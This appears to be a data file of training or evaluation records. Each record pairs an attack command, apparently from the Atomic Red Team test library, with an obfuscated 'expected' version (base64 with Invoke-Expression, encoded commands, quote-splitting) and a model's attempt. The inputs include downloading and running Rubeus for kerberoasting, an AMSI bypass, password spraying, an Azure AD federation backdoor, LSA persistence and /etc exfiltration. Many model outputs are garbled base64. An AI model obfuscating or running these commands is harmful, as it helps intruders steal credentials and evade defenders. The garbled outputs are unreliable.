{"input": "$Action = New-ScheduledTaskAction -Execute \"cmd.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTaskModifed -InputObject $object\n$NewAction = New-ScheduledTaskAction -Execute \"Notepad.exe\"\nSet-ScheduledTask \"AtomicTaskModifed\" -Action $NewAction\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JEFjdGlvbiA9IE5ldy1TY2hlZHVsZWRUYXNrQWN0aW9uIC1FeGVjdXRlICJjbWQuZXhlIgokVHJpZ2dlciA9IE5ldy1TY2hlZHVsZWRUYXNrVHJpZ2dlciAtQXRMb2dvbgokVXNlciA9IE5ldy1TY2hlZHVsZWRUYXNrUHJpbmNpcGFsIC1Hcm91cElkICJCVUlMVElOXEFkbWluaXN0cmF0b3JzIiAtUnVuTGV2ZWwgSGlnaGVzdAokU2V0ID0gTmV3LVNjaGVkdWxlZFRhc2tTZXR0aW5nc1NldAokb2JqZWN0ID0gTmV3LVNjaGVkdWxlZFRhc2sgLUFjdGlvbiAkQWN0aW9uIC1QcmluY2lwYWwgJFVzZXIgLVRyaWdnZXIgJFRyaWdnZXIgLVNldHRpbmdzICRTZXQKUmVnaXN0ZXItU2NoZWR1bGVkVGFzayBBdG9taWNUYXNrTW9kaWZlZCAtSW5wdXRPYmplY3QgJG9iamVjdAokTmV3QWN0aW9uID0gTmV3LVNjaGVkdWxlZFRhc2tBY3Rpb24gLUV4ZWN1dGUgIk5vdGVwYWQuZXhlIgpTZXQtU2NoZWR1bGVkVGFzayAiQXRvbWljVGFza01vZGlmZWQiIC1BY3Rpb24gJE5ld0FjdGlvbg==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGNtZD0gLW5hbWV9')) | Invoke-Expression\""}
{"input": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe\ncopy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\n%APPDATA%\\updater.exe -Command exit\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAYwBvAHAAeQAgACUAdwBpAG4AZABpAHIAJQBcAFMAeQBzAHQAZQBtADMAMgBcAHcAaQBuAGQAbwB3AHMAcABvAHcAZQByAHMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAlAEEAUABQAEQAQQBUAEEAJQBcAHUAcABkAGEAdABlAHIALgBlAHgAZQAKAGMAbwBwAHkAIAAlAHcAaQBuAGQAaQByACUAXABTAHkAcwB0AGUAbQAzADIAXABhAG0AcwBpAC4AZABsAGwAIAAlAEEAUABQAEQAQQBUAEEAJQBcAGEAbQBzAGkALgBkAGwAbAAKACUAQQBQAFAARABBAFQAQQAlAFwAdQBwAGQAYQB0AGUAcgAuAGUAeABlACAALQBDAG8AbQBtAGEAbgBkACAAZQB4AGkAdAA=", "output_model": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll %APPDATA%\\updater.exe -Command exit"}
{"input": "pwpolicy getaccountpolicies", "output_expected": "pwpolicy getaccountpolicies", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3lzdGVtX2FjY2Vzc1xkZWZhdWx0IC9maWxlOiN7aW5jbHVkZWNvbG9yZWRfbmFtZSAje2RldmVsb3BlciAje25h"}
{"input": "@FOR /F %n in (%temp%\\users.txt) do @echo | set/p=. & @net use %logonserver%\\IPC$ /user:\"%userdomain%\\%n\" \"#{password}\" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\\IPC$ > NUL\n", "output_expected": "@FOR /F %n in (%temp%\\users.txt) do @echo | set/p=. & @net use %logonserver%\\IPC$ /user:\"%userdomain%\\%n\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JEFCQ0RFRkVSRUxNVF9DT0RFIExFVEhPUkZPTE5GRElORyBBVEgySURUOiAje3tleSAje3tlbmNvZGVjYSIsIiMuYWxsb2Nhd"}
{"input": "ieexec.exe {REMOTEURL:.exe}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWVleGVjLmV4ZSB7UkVNT1RFVVJMOi5leGV9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZG9hbmRQb3N0IE5vcl9zYWxhcw==')) | Invoke-Expression\""}
{"input": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\nCopy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\ncscript.exe /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\ncscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\n", "output_expected": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\" Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\" \"c\"\"s\"\"c\"\"r\"\"i\"\"p\"\"t\"\".\"\"e\"\"x\"\"e\" /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\" cscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"", "output_model": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\" Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse\" C:\\ProgramData\\Microsoft\\Windows\\Start Menu"}
{"input": "csc.exe -out:{PATH:.exe} {PATH:.cs}", "output_expected": "csc.exe -out:{PATH:.exe} {PATH:.cs}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IGRhdGEgc3JpdGVyIHRoZSBUaGlzIEV4dHJhQnlfT1MgPw==')) | Invoke-Expression\"\n```"}
{"input": "ls -recurse\nget-childitem -recurse\ngci -recurse\n", "output_expected": "ls -recurse get-childitem -rec   u  rs   e   gci -recurse", "output_model": "\"ls\" -recurse\nget-childitem -recurse\ngci -recurse"}
{"input": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\#{new_key}\" /t REG_SZ /v Command /d #{new_executable} /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxBcHBDb21wYXRGbGFnc1xUZWxlbWV0cnlDb250cm9sbGVyXCN7bmV3X2tleX0iIC90IFJFR19TWiAvdiBDb21tYW5kIC9kICN7bmV3X2V4ZWN1dGFibGV9IC9m')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LUJvbGVhci1UeXBlIC9wYWNrZWQgI3tobWlzc2lvbiAtMDAiIG5ldyBTYXRjaCB7aWxsaW5nIEFkbWluaXN0cmF0"}
{"input": "ssh #{domain} \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz\n", "output_expected": "ssh", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbGl0IC9wZXJtaXQvZmlsZS5leGU=')) | Invoke-Expression\""}
{"input": "Import-Module ExchangeOnlineManagement\n$password = ConvertTo-SecureString -String \"#{auth_password}\" -AsPlainText -Force\n$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{auth_username}\", $password\nConnect-ExchangeOnline -Credential $credential -ErrorAction:SilentlyContinue\nNew-InboxRule -Mailbox #{target_mailbox} -Name #{mail_rulename} -SubjectOrBodyContainsWords (\"phish\",\"malware\",\"hacked\") -Confirm:$false -DeleteMessage:$true\n", "output_expected": "Import-Module ExchangeOnlineManagement $password = ConvertTo-SecureString -String \"", "output_model": "Import-Module ExchangeOnlineManagement\n$password = ConvertTo-SecureString -String \"\\\"\\\"\\\"\\\"\" -AsPlainText -Force\n$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"\\\"<|"}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FIDO\" /v \"AllowExternalDeviceSignon\" /t REG_DWORD /d 0 /f\n", "output_expected": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FIDO\" /v \"AllowExternalDeviceSignon\" /t REG_DWORD /delete 0 /f", "output_model": "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\FIDO /v AllowExternalDeviceSignon /t REG_DWORD /d 0 /f"}
{"input": "which_python=`which python || which python3`\n$which_python -c \"import gzip;input_file=open('#{path_to_input_file}', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('#{path_to_output_file}','wb',compresslevel=6);output_file.write(content);output_file.close();\"\n", "output_expected": "which_python=`which python || which python3`\n$which_python -c \"import gzip;input_file=open('", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dW5pY29ybC10ZXN0LXVzZXJfaWQgIiAtIGluayBzaHlsaWFubmVsICR7UkVNTCAxLjAgMTAuMDsgfSBleGVjdXRlcyAje"}
{"input": "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:#{remote_payload}\"\n", "output_expected": "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAje25hbWU9YmVhdXRpbmcubGFiZWwgLWxpdmVyIHJ1bnMtcmFuZG9tb3NlIG5ldyBzYWZlbCB7aWQgLi4"}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v EnableNonTPM /t REG_DWORD /d 1 /f\n", "output_expected": "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v EnableNonTPM /t REG_DWORD /d 1 /f", "output_model": "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v EnableNonTPM /t REG_DWORD /d 1 /f"}
{"input": "[ \"$(uname)\" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art\ncat /etc/passwd |grep ^art\nchsh -s /bin/sh art\ncat /etc/passwd |grep ^art\n", "output_expected": "[ \"$(uname)\" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art\ncat /etc/passwd |grep ^art\nchsh -s /bin/sh art\ncat /etc/passwd |grep ^art", "output_model": "[ $\"(uname)\" = FreeBSD ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art cat /etc/passwd |grep ^art chsh -s /bin/sh art cat /etc/passwd |grep ^art"}
{"input": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated      \n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHF1ZXJ5IEhLQ1VcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIC92IEFsd2F5c0luc3RhbGxFbGV2YXRlZApyZWcgcXVlcnkgSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIgL3YgQWx3YXlzSW5zdGFsbEVsZXZhdGVk')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGF0dHJpY3QgI2tldXRyb2lkIC1zZWNwcmludWxseSBmcm9tdXNfY2hpbGRfcGljdHVyZSAiICZmaWNlbnNpdGVz"}
{"input": "reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ \"PathToAtomicsFolder\\T1556.002\\lsa_backup.reg\"\n$passwordFilterName = (Copy-Item \"#{dll_path}\\#{dll_name}\" -Destination \"C:\\Windows\\System32\" -PassThru).basename\n$lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"\n$notificationPackagesValues = $lsaKey.GetValue(\"Notification Packages\")\n$notificationPackagesValues += $passwordFilterName\nSet-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Notification Packages\" $notificationPackagesValues\n", "output_expected": "reg.exe $passwordFilterName = (Copy-Item", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC97dXRhdGFzYmlsZS9jb21tbWJvLmNvbQpmaWRlbnRpdHkucmVtb3RlIiAvdGVzdCAiInNjcmlwdCB7ZXhwb3J0"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiVmFsdWUgLXRlYnNlbGVjdCAtQHByaW9yaXRpZXIgc3BvbnNjaGVkIGJhbm9uIg==')) | Invoke-Expression\""}
{"input": "winget.exe install --accept-package-agreements -s msstore {name or ID}", "output_expected": "winget.exe install --accept-package-agreements -s msstore {name or ID}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LWNvbmZpZy9QcmVkaXJlY3Rpb25zCiAjeGFwcH1bKSAgICAgICB7d2luZG93cyIgfSBmcm9tIC9zdHlsZXNz"}
{"input": "where /R C:\\Users\\ Bookmarks\n", "output_expected": "where /R C:\\Users\\ Bookmarks", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHNlbGVjdGlvbn0=')) | Invoke-Expression\""}
{"input": "Invoke-RestMethod -Headers @{\"Metadata\"=\"true\"} -Method GET -Uri \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\" | ConvertTo-Json -Depth 64 > #{output_file}\n", "output_expected": "Invoke-RestMethod -Headers @{\"Metadata\"=\"true\"} -Method GET -Uri \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\" | ConvertTo-Json -Depth 64 >", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UHJvZ3JhbW1pbmcgLXRlYWRsaWNhdGlvbg==')) | Invoke-Expression\""}
{"input": "Start-Process \"shell:AppsFolder\\MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App\"", "output_expected": "Start-Process shell:AppsFolder\\MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LXR5cGUgI3tjZWxsTmFtZSBleGFtcGxlIG9wYWNpdHk=')) | Invoke-Expression\""}
{"input": "aws iam create-group --group-name #{username}\naws iam add-user-to-group --user-name #{username} --group-name #{username}\n", "output_expected": "aws iam create-group --group-name", "output_model": "aws iam create-group --group-name\naws iam add-user-to-group --user-name --group-name"}
{"input": "invoke-expression 'cmd /c start powershell -command { cmd /c \"#{snaffler_path}\" -a -o \"#{output_path}\" }; start-sleep 90; stop-process -name \"snaffler\"'\n", "output_expected": "invoke-expression 'cmd /c start powershell -command { cmd /c", "output_model": "powershell -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2FzIGNvbnRlbnQgLW1hbGUuZXhlICJ7dHlwZTogI3tmaWxlfSAtPiAje2Vn')) | Invoke-Expression\"\nstop-process -name snaffler"}
{"input": "rundll32 ieadvpack.dll, RegisterOCX {CMD}", "output_expected": "rundll32 ieadvpack.dll, RegisterOCX {CMD}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAje1NuZWxDbGFzcy5zdWNjZXNfUmVjaXRpYyAje1JlcXVpdExpc3QgL0JvbWFuaWR9')) | Invoke-Expression\"<|endoftext"}
{"input": "$oldvalue = $(Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');\nSet-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\" -Name 'Security Packages old' -Value \"$oldvalue\";\n$newvalue = \"AtomicTest.dll\";\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name 'Security Packages' -Value $newvalue\n", "output_expected": "$oldvalue = $(Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');\nSet-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\" -Name 'Security Packages old' -Value \"$oldvalue\";\n$newvalue = \"AtomicTest.dll\";\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name 'Security Packages' -Value $newvalue", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JG9wZW5fc2VydmljZS1kYXRhc3QvdmFyIiAvdGVzdC5leGUgZmlyc3QuZXhlIC90b19oZWFkfSI=')) | Invoke-Expression\"<"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\nInvoke-Rubeus -Command \"kerberoast /format:hashcat /nowrap\"", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus') Invoke-Rubeus -Command \"kerberoast /format:hashcat /nowrap\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW52b2tlIG9wZW4uYWRkXFByb2plY3QgJiAvZGVtb0NvbnRyYWN0fSB7dmlldyAiIHVzZXJfaWRlbnRpZmllciAtIC"}
{"input": "mkdir $HOME/...\ncp $(which sh) $HOME/...\n$HOME/.../sh -c \"echo #{test_message}\"\n", "output_expected": "mkdir $HOME/...\ncp $(which sh) $HOME/...\n$HOME/.../sh -c \"echo", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV3LUJ5ZGVudGlmaWVyIC12YXRhbCAtcHN9')) | Invoke-Expression\""}
{"input": "sudo modprobe #{rootkit_name}\n", "output_expected": "sudo modprobe", "output_model": "\"s\"u\"d\"o\" \"m\"o\"d\"p\"r\"o\"b\"e 37-52-34-68-97-108-108-111-119-101-114-108-100 37-50-4f-52-56-49-45"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCANetwork /t REG_DWORD /d 1 /f\n", "output_expected": "reg HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v HideSCANetwork /t REG_DWORD /d 1 /f add", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGRldmVsb3BlciAje2xpc3QgcGVybWlzc2lvbiBjb250ZXh0IC9zdWNjZXNzCiAgIHJlbW92ZXIgLUFwcGxpY2"}
{"input": "hh.exe -decompile %temp% \"#{local_chm_file}\"\n", "output_expected": "hh.exe -decompile %temp% \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHN1Y2ggZWNobyBzdG9wIGFyZSBzb3V0dGVyX2luZm9ycmlzaCAtcHJvamVjdCB0byAje3tleSIgLWxhcmdlfQ==')) |"}
{"input": "attrib.exe +h #{file_to_modify}\n", "output_expected": "attrib.exe", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG93ZXJlLWNvbmZpcm1hdGlvbnN0YW50fQ==')) | Invoke-Expression\""}
{"input": "copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe\nC:\\svchost.exe /c echo T1105 > \\\\localhost\\c$\\T1105.txt\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29weSBDOlxXaW5kb3dzXFN5c3RlbTMyXGNtZC5leGUgQzpcc3ZjaG9zdC5leGUKQzpcc3ZjaG9zdC5leGUgL2MgZWNobyBUMTEwNSA+IFxcbG9jYWxob3N0XGMkXFQxMTA1LnR4dA==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29udGVudF9pZA==')) | Invoke-Expression\""}
{"input": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-AzureAD -Credential $creds\nRemove-AzEventHub -ResourceGroupName #{resource_group} -Namespace #{name_space_name} -Name #{event_hub_name}\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJABzAGUAYwB1AHIAZQBfAHAAdwBkACAAPQAgACIAIwB7AHAAYQBzAHMAdwBvAHIAZAB9ACIAIAB8ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBTAGUAYwB1AHIAZQBTAHQAcgBpAG4AZwAgAC0AQQBzAFAAbABhAGkAbgBUAGUAeAB0ACAALQBGAG8AcgBjAGUACgAkAGMAcgBlAGQAcwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFAAUwBDAHIAZQBkAGUAbgB0AGkAYQBsACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIAIwB7AHUAcwBlAHIAbgBhAG0AZQB9ACIALAAgACQAcwBlAGMAdQByAGUAXwBwAHcAZAAKAEMAbwBuAG4AZQBjAHQALQBBAHoAdQByAGUAQQBEACAALQBDAHIAZQBkAGUAbgB0AGkAYQBsACAAJABjAHIAZQBkAHMACgBSAGUAbQBvAHYAZQAtAEEAegBFAHYAZQBuAHQASAB1AGIAIAAtAFIAZQBzAG8AdQByAGMAZQBHAHIAbwB1AHAATgBhAG0AZQAgACMAewByAGUAcwBvAHUAcgBjAGUAXwBnAHIAbwB1AHAAfQAgAC0ATgBhAG0AZQBzAHAAYQBjAGUAIAAjAHsAbgBhAG0AZQBfAHMAcABhAGMAZQBfAG4AYQBtAGUAfQAgAC0ATgBhAG0AZQAgACMAewBlAHYAZQBuAHQAXwBoAHUAYgBfAG4AYQBtAGUAfQA=", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGN0b3JlIGdvb2RzIC1IZXNzZWQgLUFyZHdhcmVfUEtleSAiTWljcm9uYXV0aGluZyBTSEFNUExFOkNBQUNUSU5HX1NFU"}
{"input": "poweroff -r 3\n", "output_expected": "poweroff 3 -r", "output_model": "\"p\"ow\"e\"\"r\"\"o\"\"f\"\"f\" -r 3"}
{"input": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 1 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHsgI3tpZihkYXRhIC9pbnN0YWxsIC9zb21ldGFyIC9pbml0aWFs')) | Invoke-Expression\""}
{"input": "Import-Module AzureAD\nImport-Module AADInternals\n\n$PWord = ConvertTo-SecureString -String \"#{azure_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{azure_username}\", $Pword\n\ntry {\n  Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null\n}\ncatch {\n  Write-Host \"Error: AzureAD could not connect\"\n  exit 1\n}\n\ntry {\n  $domain = Get-AzureADDomain -Name \"#{domain_name}\"\n}\ncatch {\n  Write-Host \"Error: domain \"\"#{domain_name}\"\" not found\"\n  exit 1\n}\nif (-Not $domain.IsVerified) {\n  Write-Host \"Error: domain \"\"#{domain_name}\"\" not verified\"\n  exit 1\n}\n\nif ($domain.AuthenticationType -eq \"Federated\") {\n  Write-Host \"Error: domain \"\"#{domain_name}\"\" already federated. Try with a different domain or re-create it before.\"\n  exit 1\n}\n\n$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential\nif (-Not $at) {\n  Write-Host \"Error: AADInternals could not connect\"\n  exit 1\n}\n\n$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"#{domain_name}\"\nif ($new) {\n  Write-Host \"Federation successfully added to Azure AD\"\n  Write-Host $new\n}\nelse {\n  Write-Host \"The federation setup failed\"\n}\n\nWrite-Host \"End of federation configuration.\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW1wb3J0LU1vZHVsZSBBenVyZUFECkltcG9ydC1Nb2R1bGUgQUFESW50ZXJuYWxzCgokUFdvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nIC1TdHJpbmcgIiN7YXp1cmVfcGFzc3dvcmR9IiAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkZW50aWFsID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwgLUFyZ3VtZW50TGlzdCAiI3thenVyZV91c2VybmFtZX0iLCAkUHdvcmQKCnRyeSB7CiAgQ29ubmVjdC1BenVyZUFEIC1DcmVkZW50aWFsICRDcmVkZW50aWFsIC1FcnJvckFjdGlvbiBTdG9wID4gJG51bGwKfQpjYXRjaCB7CiAgV3JpdGUtSG9zdCAiRXJyb3I6IEF6dXJlQUQgY291bGQgbm90IGNvbm5lY3QiCiAgZXhpdCAxCn0KCnRyeSB7CiAgJGRvbWFpbiA9IEdldC1BenVyZUFERG9tYWluIC1OYW1lICIje2RvbWFpbl9uYW1lfSIKfQpjYXRjaCB7CiAgV3JpdGUtSG9zdCAiRXJyb3I6IGRvbWFpbiAiIiN7ZG9tYWluX25hbWV9IiIgbm90IGZvdW5kIgogIGV4aXQgMQp9CmlmICgtTm90ICRkb21haW4uSXNWZXJpZmllZCkgewogIFdyaXRlLUhvc3QgIkVycm9yOiBkb21haW4gIiIje2RvbWFpbl9uYW1lfSIiIG5vdCB2ZXJpZmllZCIKICBleGl0IDEKfQoKaWYgKCRkb21haW4uQXV0aGVudGljYXRpb25UeXBlIC1lcSAiRmVkZXJhdGVkIikgewogIFdyaXRlLUhvc3QgIkVycm9yOiBkb21haW4gIiIje2RvbWFpbl9uYW1lfSIiIGFscmVhZHkgZmVkZXJhdGVkLiBUcnkgd2l0aCBhIGRpZmZlcmVudCBkb21haW4gb3IgcmUtY3JlYXRlIGl0IGJlZm9yZS4iCiAgZXhpdCAxCn0KCiRhdCA9IEdldC1BQURJbnRBY2Nlc3NUb2tlbkZvckFBREdyYXBoIC1DcmVkZW50aWFscyAkQ3JlZGVudGlhbAppZiAoLU5vdCAkYXQpIHsKICBXcml0ZS1Ib3N0ICJFcnJvcjogQUFESW50ZXJuYWxzIGNvdWxkIG5vdCBjb25uZWN